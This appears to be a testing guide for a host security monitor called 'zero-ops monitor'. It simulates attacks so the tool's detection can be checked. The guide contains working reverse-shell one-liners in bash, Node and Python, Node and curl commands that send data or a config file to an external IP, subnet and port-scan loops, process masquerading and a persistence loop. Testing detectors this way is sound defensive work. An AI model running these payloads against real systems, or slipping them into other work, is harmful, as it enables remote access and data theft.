# Simulation & Testing Guide: Security Monitor

This guide provides step-by-step instructions to simulate security threats and verify the detection capabilities of the `zero-ops monitor` tool.

---

## 1. Simulating a Reverse Shell (Linux/macOS)

A reverse shell occurs when a shell (like `bash`) initiates an outbound connection to a remote listener.

### **Step A: Start a Listener (Attacker)**
In one terminal, start a listener on port 4444:
```bash
nc -lp 4444
```

### **Step B: Initiate the Reverse Shell (Victim)**
In a second terminal, execute a bash reverse shell targeting the listener:
```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

### **Step C: Verify Detection**
In a third terminal, run the security scanner:
```bash
zero-ops monitor reverse-shell
```
**Expected Result:** The scanner should flag the `bash` process as a potential threat because it has an established connection and matches a sensitive binary signature.

---

## 2. Simulating a Hidden Listener (Public Exposure)

Malicious actors often leave "backdoors" or hidden listeners to regain access.

### **Step A: Create a Public Listener**
Start a simple Python-based web server listening on all interfaces (0.0.0.0):
```bash
python3 -m http.server 8888 --bind 0.0.0.0
```

### **Step B: Verify Detection**
Run the listeners audit:
```bash
zero-ops monitor listeners
```
**Expected Result:** The scanner should flag port 8888 with a **`[⚠️ PUBLIC]`** tag, indicating that it is exposed to the internet, not just localhost.

---

## 3. Testing Behavioral Baselining

This verify how the tool handles anomalies after a trusted state is established.

### **Step A: Capture Baseline**
Ensure your system is in a "known good" state and run:
```bash
zero-ops monitor baseline
```

### **Step B: Introduce an Anomaly**
Start any new network-connected application (e.g., `nc -l 9999`).

### **Step C: Verify Detection**
Run the network audit:
```bash
zero-ops monitor network
```
**Expected Result:** The new connection to port 9999 should be highlighted with a red **`[NEW]`** tag, whereas established connections from Step A remain clean.

---

## 4. Testing Integrated Background Alerts

### **Step A: Configure Telegram**
Ensure your Telegram bot is configured:
```bash
zero-ops telegram config set token "YOUR_TOKEN"
zero-ops telegram config set chat_id "YOUR_ID"
```

### **Step B: Start Daemon**
```bash
zero-ops monitor start
```

### **Step C: Trigger Threat**
Initiate the reverse shell from **Scenario 1**.

### **Step D: Verify Alert**
**Expected Result:** You should receive a Telegram notification within 10 seconds (default polling interval) containing the PID and process name of the suspicious shell.

---

## 5. Active Response Verification

### **Step A: Identify Threat**
Run `zero-ops monitor reverse-shell` and note the **PID**.

### **Step B: Kill Threat**
```bash
zero-ops monitor kill <PID>
```

### **Step C: Confirm Termination**
Run the scan again. The suspicious connection should no longer exist.

---

## **Clean Up**
After testing, always terminate your simulation processes (`nc`, `python`) and stop the monitor daemon:
```bash
zero-ops monitor stop
```

---

## 🛡 Advanced Real-World Hacker Scenarios

These scenarios mimic the actual steps a hacker takes to gain a foothold in a system.

### **Scenario 6: The Web Shell (RCE Simulation)**
**Concept:** A hacker exploits a vulnerability in a web app to upload a "web shell" script that connects back to them.

1.  **Step A (The Entry Point):** Imagine you have a Node.js server with a vulnerability. Instead of a real server, we will simulate the "Malicious Payload" execution:
    ```bash
    # This mimics a Node.js webapp being forced to open a socket
    node -e 'const s=require("net").Socket();s.connect(4444,"127.0.0.1",()=>{const b=require("child_process").spawn("/bin/bash",[]);s.pipe(b.stdin);b.stdout.pipe(s);b.stderr.pipe(s);});' &
    ```
2.  **Step B (Identification):** Run the scan:
    ```bash
    zero-ops monitor reverse-shell
    ```
3.  **Why it works:** Hackers love using `node` or `python` to open shells because they look like legitimate dev tools. The `monitor` tool knows that a `node` process should rarely be talking directly to a shell binary (`bash`) while maintaining a network socket.

### **Scenario 7: The Python "Sleepy" Backdoor**
**Concept:** A hacker hides a backdoor in a background script that only activates occasionally or stays silent.

1.  **Step A (The Backdoor):** Run this subtle Python-based connection:
    ```bash
    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &
    ```
2.  **Step B (Forensics):**
    ```bash
    # Identify the PID first
    zero-ops monitor reverse-shell
    # Deep-dive into the PID to see the full malicious command line
    zero-ops monitor inspect <PID>
    ```
3.  **Why it works:** Most standard tools just show "python3". However, our **`inspect`** command reveals the entire `-c 'import socket...'` payload, exposing exactly what the hacker is doing.

### **Scenario 8: Bypassing Detection via Baselining**
**Concept:** A hacker tries to blend in. This test shows you how to detect them by *not* trusting them during setup.

1.  **Step A:** Start your "Normal" apps.
2.  **Step B:** Run `zero-ops monitor baseline`.
3.  **Step C:** Simulate a hacker gaining access 5 minutes later (Start another `nc -l 5555`).
4.  **Step D:** Run `zero-ops monitor network`.
5.  **Result:** The hacker's connection is flagged as **`[NEW]`**. Since you haven't baselined it, it stands out immediately as an anomaly.

### **Scenario 9: The "Ghost" Credential Harvester (Data Exfiltration)**
**Concept:** A hacker runs a silent background process that periodically sends stolen data (tokens, passwords) to their remote server.

1.  **Step A (Setup Baseline):** Ensure your system is clean and run:
    ```bash
    zero-ops monitor baseline
    ```
2.  **Step B (The Exfiltration):** Simulate a background process sending data to an external "Attacker" IP:
    ```bash
    # Mimics a process sending data to a remote server (e.g., 93.184.216.34)
    node -e 'setInterval(() => { const s=require("net").Socket(); s.connect(80, "93.184.216.34", () => { s.write("stolen_data\n"); s.end(); }); }, 5000)' &
    ```
3.  **Step C (Detection):**
    ```bash
    zero-ops monitor network
    ```
4.  **Result:** Even if the process is named `node`, the connection to the external IP will be flagged as **`[NEW]`**.
5.  **Forensics:** Use `zero-ops monitor inspect <PID>` to see exactly what script `node` is running. You will see the `stolen_data` exfiltration logic in the command-line arguments.

### **Scenario 10: Process Masquerading (The Chameleon)**
**Concept:** A hacker renames their malicious process to look like a trusted system process (e.g., `(ssh)`, `(kworker)`, or `(vscode)`).

1.  **Step A (The Masquerade):** Run a malicious process that renames itself (requires a small script):
    ```bash
    # This mimics a process changing its title to look like an SSH daemon
    node -e 'process.title="[ssh]"; setInterval(() => { const s=require("net").Socket(); s.connect(4444, "127.0.0.1"); }, 5000)' &
    ```
2.  **Step B (Detection):**
    ```bash
    zero-ops monitor network
    ```
3.  **Result:** You will see a process named `[ssh]` (or similar) in the list.
4.  **Forensics:** This is where **`inspect`** shines. Run `zero-ops monitor inspect <PID>`.
    - **Wait!** The `inspect` command will show the *actual* binary path and the *actual* command line arguments, revealing it's actually `node` running a masquerade script.

### **Scenario 11: Lateral Movement Simulation**
**Concept:** Once inside, hackers scan your *local* network to find other vulnerable machines (DBs, file servers).

1.  **Step A (The Scan):** Simulate an internal subnet scan attempt:
    ```bash
    # This mimics a script trying to connect to multiple internal IPs on port 22 (SSH)
    for i in {1..5}; do nc -z -w 1 192.168.1.$i 22 & done
    ```
2.  **Step B (Detection):**
    ```bash
    zero-ops monitor network
    ```
3.  **Result:** You will see multiple outgoing "SYN_SENT" or established connections to internal private IPs (192.168.x.x) on port 22.
4.  **Verdict**: Legitimate developer tools usually connect to *specific* known servers. A broad "shotgun" scan of a subnet is a classic indicator of a compromised machine attempting lateral movement.

### **Scenario 12: Living off the Land (LotL)**
**Concept:** Hackers use built-in system tools like `curl` or `wget` to download malicious payloads or exfiltrate data, as these tools are already trusted by the OS.

1.  **Step A (The Exfiltration):** Use `curl` to simulate sending a sensitive file to an external server:
    ```bash
    # Mimics sending your config file to an attacker's listener
    curl -X POST -d @~/.zero-ops-config.json http://93.184.216.34/upload &
    ```
2.  **Step B (Detection):**
    ```bash
    zero-ops monitor network
    ```
3.  **Result:** You will see `curl` in the network list with an "ESTABLISHED" connection to a non-baseline IP.
4.  **Forensics:** Use `zero-ops monitor inspect <PID>` to see exactly which file `curl` was targeting in its arguments.

### **Scenario 13: The "Persistent" Call-Home (Persistence)**
**Concept:** A hacker sets up a cronjob or background script that tries to "re-connect" to them every 60 seconds if the shell is closed.

1.  **Step A (The Persistence):** Run a loop that mimics a background persistence agent:
    ```bash
    # Mimics a script that wakes up every 10 seconds to check for a connection
    while true; do nc -z -w 1 127.0.0.1 4444 || echo "Reconnecting..."; sleep 10; done &
    ```
2.  **Step B (Detection):**
    ```bash
    # Start the daemon to catch the periodic "noise"
    zero-ops monitor start
    zero-ops monitor logs
    ```
3.  **Result:** You will see repeated connection attempts in the logs. Even if you kill the process, it will reappear 10 seconds later.
4.  **Verdict**: This indicates a **Persistence Mechanism**. You must find the parent script or the crontab entry to stop it permanently.

### **Scenario 14: Hosting a Fake Phishing Site**
**Concept:** A hacker uses your server to host a fake login page to steal credentials from *other* users.

1.  **Step A (The Phishing Site):** Start a listener on a port commonly used for web dev (like 8080):
    ```bash
    # Mimics an unauthorized web server
    python3 -m http.server 8080 &
    ```
2.  **Step B (Detection):**
    ```bash
    zero-ops monitor listeners
    ```
3.  **Result:** Port 8080 will be flagged. If you didn't start this server, someone is using your machine as a hosting platform.

### **Scenario 15: Sequential Port Sweeping (Discovery)**
**Concept:** A hacker scans *your* machine to find every open port you have.

1.  **Step A (The Sweep):** Run a rapid sequential scan:
    ```bash
    # Mimics a port scanner (nmap-style)
    for port in {80..90}; do nc -z -v -w 1 127.0.0.1 $port; done
    ```
2.  **Step B (Detection):**
    ```bash
    # Run a snapshot during the sweep
    zero-ops monitor snapshot
    ```
3.  **Result:** The total number of connections will spike. In **`watch`** mode, you will see a flurry of activity.

---

## 🛑 Is this "All" Hackers Do?

**Absolutely not.** Security is an arms race. Hackers also use:
- **DNS Exfiltration**: Sending data slowly via DNS queries (to bypass firewalls).
- **Steganography**: Hiding data inside images.
- **Rootkits**: Modifying the OS kernel to hide files and processes (preventing `lsof` or `netstat` from seeing them).
- **In-Memory Injection**: Running code entirely in RAM without any files on disk.

**Why `zero-ops monitor` is still effective:**
Most hackers *must* talk to the outside world eventually to get instructions (C2) or exfiltrate data. By monitoring **network behavior** and **process lineage**, we can catch them at the most critical step: communication.

---

## 🕵️ Forensic Checklist for Identifying Hackers
If you see a suspicious alert, follow this "Hacker Response" flow:
1.  **Identify**: Use `monitor network` or `monitor reverse-shell` to see who is connected.
2.  **Verify**: Use `monitor inspect <PID>` to see the **Parent PID**.
    - *Suspicious*: If a web server (like `nginx`, `node`, `apache`) is the parent of a `bash` shell.
    - *Suspicious*: If a process has a parent PID of `1` (init/launchd) but has a weird name.
3.  **Contain**: Use `monitor kill <PID>` to sever the connection immediately.
4.  **Audit**: Check your **Telegram logs** via `zero-ops monitor logs` or your phone to see when the intrusion first began.
5.  **Update Baseline**: Once you've cleaned the threat, run `baseline` again to reset your "Safe State".
